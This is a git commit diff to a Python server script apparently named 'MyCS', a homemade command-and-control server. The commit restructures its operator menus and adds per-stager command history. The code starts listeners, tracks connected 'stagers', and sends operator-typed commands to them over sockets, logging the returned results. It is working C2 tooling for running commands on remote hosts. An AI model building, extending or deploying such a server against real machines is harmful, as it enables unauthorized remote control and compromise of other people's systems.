87c2ad422f2f15be553f3c548c9be2a52fd2d9cf
Oliver9977 <36608871+Oliver9977@users.noreply.github.com>
2021-02-25 07:12:58 -0800

    try harder

--- Server/myserver.py
+++ Server/myserver.py
@@ -6,15 +6,34 @@ import uuid
 
 class myconstant():
     def __init__(self):
-        self.SETHOSTNAME = 1
-        self.SETPORT = 2
-        self.GETINFO = 3
-        self.STARTLISTENER = 4
-        self.GETSTAGER = 5
-        self.INTOSTAGER = 6
-        self.GETLISTENER = 7
-        self.STOPLISTENER = 8
-        self.EXIT = 9
+
+        self.TAG_MYCS = "[MYCS]"
+        self.TAG_LISTENER = "[Listener]"
+        self.TAG_STAGER = "[Stager]"
+        self.TAG_INTE_STAGER = "[Interact]"
+
+        self.CMD_USELISTENER = "uselistener"
+        self.CMD_USESTAGER = "userstager"
+        self.CMD_INTERACTSTAGER = "interactstager"
+        self.CMD_HELP = "help"
+        self.CMD_EXIT = "exit"
+
+        self.CMD_BACK = "back"
+        self.CMD_LISTENER_GETINFO = "getinfo"
+        self.CMD_LISTENER_SETHOSTNAME = "sethostname"
+        self.CMD_LISTENER_SETPORT = "setport"
+        self.CMD_LISTENER_START = "start"
+        self.CMD_LISTENER_LIST = "list"
+        self.CMD_LISTENER_STOP = "stop"
+
+        self.CMD_STAGER_GET_LIST = "list"
+        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
+        self.CMD_STAGER_GET_INTO = "into"
+        self.CMD_STAGER_GET_HISTORY = "history"
+        self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
+
+        
+        
 
 class myconstant_networking():
     def __init__(self):
@@ -27,7 +46,9 @@ class myserver():
         self.__mysocket_list = dict()
         self.__mydata_list = dict()
         self.__myaddr_list = dict()
+        self.__mymsg_list = dict()
         self.__myuuid_list = list()
+        self.__mystart_list = dict() #bool
 
         self.__mylistener_start_list = dict() #bool
         self.__mylistener_hostname_list = dict()
@@ -37,7 +58,7 @@ class myserver():
 
         self.__hostname = "127.0.0.1"
         self.__port = 4444
-        self.__test = "This is the test"
+
 
     def start_worker(self,myuuid):
         t_net_constant = myconstant_networking()
@@ -46,6 +67,7 @@ class myserver():
             # This will be the main runner
             item_que = self.__mydata_list[myuuid]
             mysocket = self.__mysocket_list[myuuid]
+            myhistory = self.__mymsg_list[myuuid]
             try:
                 cmd_struct_to_send = item_que.get(block=True, timeout=5)
             except queue.Empty:
@@ -53,39 +75,41 @@ class myserver():
                 continue
             
             try:
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                 encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_tag)
-                print("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
+                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
                 recv_result = mysocket.recv(1024)
                 decode_result = recv_result.decode("ascii", "ignore")
-                print("[Stager] Send command_tag result: {}".format(decode_result))
+                myhistory.append("[Stager] Send command_tag result: {}".format(decode_result))
 
                 encode_cmd = cmd_struct_to_send[1].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
-                print("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
+                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                 recv_result = mysocket.recv(1024)
                 decode_result = recv_result.decode("ascii", "ignore")
-                print("[Stager] Send command result: {}".format(decode_result))
+                myhistory.append("[Stager] Send command result: {}".format(decode_result))
 
                 # try get cmd result if any
                 recv_result = mysocket.recv(1024)
                 decode_result = recv_result.decode("ascii", "ignore")
-                print("[Stager] Run Command result: {}".format(decode_result))
+                myhistory.append("[Stager] Run Command result: {}".format(decode_result))
                 # ack for success
                 encode_cmd = t_net_constant.PSRUN_SUCCESS.encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
-                print("[DEBUG] PSRUN_SUCCESS sent")
+                myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
 
             except Exception as e:
-                print("Exception: ",e)
+                myhistory.append("Exception: " + str(e))
                 mysocket.shutdown(socket.SHUT_RDWR)
                 mysocket.close()
                 #remove from worker list
                 self.__mydata_list.pop(myuuid, None)
                 self.__mysocket_list.pop(myuuid, None)
                 self.__myaddr_list.pop(myuuid, None)
-                self.__myuuid_list.remove(myuuid)
-                print("[Stager] {} is stoped ...".format(myuuid))
+                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
+                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                 break
 
 
@@ -116,8 +140,12 @@ class myserver():
                 self.__myaddr_list[myuuid] = addr
                 #create fifo
                 self.__mydata_list[myuuid] = queue.Queue()
+                #create history
+                self.__mymsg_list[myuuid] = list()
                 #push uuid
                 self.__myuuid_list.append(myuuid)
+                #set start
+                self.__mystart_list[myuuid] = True
                 print("[Listener] myuuid is {}".format(myuuid))
                 threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                 
@@ -157,6 +185,12 @@ class myserver():
     def get_listener(self):
         return self.__mylistener_uuid_list
 
+    def print_stager_running(self):
+        return [a for a in self.__myuuid_list if self.__mystart_list[a]]
+
+    def get_history(self):
+        return self.__mymsg_list
+
     def set_hostname(self,hostname):
         assert(type(hostname) is str)
         self.__hostname = hostname
@@ -166,87 +200,165 @@ class myserver():
         self.__port = port
 
 
-def cmd_list():
-    print("1. Set listener hostname")
-    print("2. Set listener portnumber")
-    print("3. Get Info")
-    print("4. Start listener")
-    print("5. Get Stager")
-    print("6. Interact with Stager")
-    print("7. Get listener")
-    print("8. Stop listener")
-    print("9. Exit")
+class mymainclass():
+
+    def __init__(self):
+        self.__t_myconstant = myconstant()
+        self.__t_myserver = myserver()
+
+    def __cmd_list_main(self):
+        print("\n+++++++++++++++++++++++++++++++++++")
+        print(self.__t_myconstant.CMD_USELISTENER + ": Go to listener settings")
+        #print(self.__t_myconstant.CMD_USESTAGER + ": Go to stager setting")
+        print(self.__t_myconstant.CMD_INTERACTSTAGER + ": Interact with live stager")
+        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
+        print(self.__t_myconstant.CMD_EXIT + ": Exit the app")
+        print("+++++++++++++++++++++++++++++++++++\n")
+
+    def __cmd_list_listener(self):
+        print("\n+++++++++++++++++++++++++++++++++++")
+        print(self.__t_myconstant.CMD_LISTENER_GETINFO + ": Print info of current listener setting")
+        print(self.__t_myconstant.CMD_LISTENER_SETHOSTNAME + ": Set hostname")
+        print(self.__t_myconstant.CMD_LISTENER_SETPORT + ": Set port number")
+        print(self.__t_myconstant.CMD_LISTENER_LIST + ": Get a list of running listener")
+        print(self.__t_myconstant.CMD_LISTENER_START + ": Start Listener using info")
+        print(self.__t_myconstant.CMD_LISTENER_STOP + ": Stop a listener")
+        print(self.__t_myconstant.CMD_HELP + ": Print cmd list and help message")
+        print(self.__t_myconstant.CMD_BACK + ": Go back to main menu")
+        print("+++++++++++++++++++++++++++++++++++\n")
+
+    def __cmd_list_stager(self):
+        print("\n+++++++++++++++++++++++++++++++++++")
+        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
+        print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
+        print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
+        print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
+        print("+++++++++++++++++++++++++++++++++++\n")
 
 
-def main():
-    
-    print("Hello To MyCS ...")
-    cmd_list()
-    
-    #init
-    t_myconstant = myconstant()
-    t_myserver = myserver()
-
-    to_exit = False
-    while (not to_exit):
-        user_input = input("Please enter your selection: ")
-        try: 
-            command_id = int(user_input)
-        except ValueError:
-            cmd_list()
-            continue
+    def main(self):
         
-        if command_id == t_myconstant.EXIT:
-            print("Thanks for using MyCS..")
-            exit()
-        if command_id == t_myconstant.GETINFO:
-            t_myserver.print_info()
-            continue
-        if command_id == t_myconstant.SETHOSTNAME:
-            user_input = input("Please enter the hostname to listen on: ")
-            t_myserver.set_hostname(user_input)
-            continue
-        if command_id == t_myconstant.SETPORT:
-            user_input = input("Please enter the port number to listen on: ")
-            t_myserver.set_portnumber(int(user_input))
-            continue
-        if command_id == t_myconstant.STARTLISTENER:
-            threading.Thread(target=t_myserver.start_listener).start()
-            continue
-        if command_id == t_myconstant.GETSTAGER:
-            t_myserver.print_stager()
-            continue
-        if command_id == t_myconstant.INTOSTAGER:
-            user_input_stager = input("Please enter the stager uuid: ")
-            if user_input_stager not in t_myserver.get_stager():
-                print("Please input a valid stager uuid")
-                continue
-            user_input_command_tag = input("Please enter the command tag: ")
-            user_input_command = input("Please enter the command: ")
-            t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
-            continue
-        if command_id == t_myconstant.GETLISTENER:
-            t_myserver.print_listener()
-        if command_id == t_myconstant.STOPLISTENER:
-            user_input_listener = input("Please enter the listener uuid: ")
-            if user_input_listener not in t_myserver.get_listener():
-                print("Please input a valid listener uuid")
-                continue
-            t_myserver.stop_listener(user_input_listener)
+        #init
+        cmd_tag = self.__t_myconstant.TAG_MYCS
+
+        print("Hello To MyCS ...")
+        
+        self.__cmd_list_main()
+        
+
+        to_exit = False
+        while (not to_exit):
+            user_input = input(cmd_tag + "> ")
+            command_id = user_input
             
+            if cmd_tag == self.__t_myconstant.TAG_MYCS: #Main menu
+                
+                # menu switch
+                if command_id == self.__t_myconstant.CMD_USELISTENER:
+                    cmd_tag = self.__t_myconstant.TAG_LISTENER
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_USESTAGER:
+                    cmd_tag = self.__t_myconstant.TAG_STAGER
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
+                    cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
+                    continue
+                
+                # main menu
+                if command_id == self.__t_myconstant.CMD_EXIT:
+                    print("Thanks for using MyCS..")
+                    exit()
+                
+                if command_id == self.__t_myconstant.CMD_HELP:
+                    self.__cmd_list_main()
+                    continue
+            
+            if cmd_tag == self.__t_myconstant.TAG_LISTENER: # Listener menu
+
+                # menu switch
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_MYCS
+                    continue
+                
+                # listener menu
+                if command_id == self.__t_myconstant.CMD_HELP:
+                    self.__cmd_list_listener()
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_LISTENER_GETINFO:
+                    self.__t_myserver.print_info()
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_LISTENER_SETHOSTNAME:
+                    user_input = input("Please enter the hostname to listen on: ")
+                    self.__t_myserver.set_hostname(user_input)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_LISTENER_SETPORT:
+                    user_input = input("Please enter the port number to listen on: ")
+                    self.__t_myserver.set_portnumber(int(user_input))
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_LISTENER_LIST:
+                    self.__t_myserver.print_listener()
+                
+                if command_id == self.__t_myconstant.CMD_LISTENER_START:
+                    threading.Thread(target=self.__t_myserver.start_listener).start()
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
+                    user_input_listener = input("Please enter the listener uuid: ")
+                    if user_input_listener not in self.__t_myserver.get_listener():
+                        print("Please input a valid listener uuid")
+                        continue
+                    self.__t_myserver.stop_listener(user_input_listener)
+                    continue
+            
+            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
+
+                # menu switch
+                if command_id == self.__t_myconstant.CMD_BACK:
+                    cmd_tag = self.__t_myconstant.TAG_MYCS
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_HELP:
+                    self.__cmd_list_stager()
+                    continue
+
+                # stager inte menu
+                if command_id == self.__t_myconstant.CMD_STAGER_GET_LIST:
+                    self.__t_myserver.print_stager()
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
+                    self.__t_myserver.print_stager_running()
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    for each_msg in self.__t_myserver.get_history()[user_input_stager]:
+                        print(each_msg)
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    user_input_command_tag = input("Please enter the command tag: ")
+                    user_input_command = input("Please enter the command: ")
+                    self.__t_myserver.create_command(user_input_stager,user_input_command_tag,user_input_command)
+                    continue
+                
+
 
 if __name__ == "__main__":
-    main()
-
-
-
-
-
-
-
-
-
-
-
+    t_mymainclass = mymainclass()
+    t_mymainclass.main()
 
 
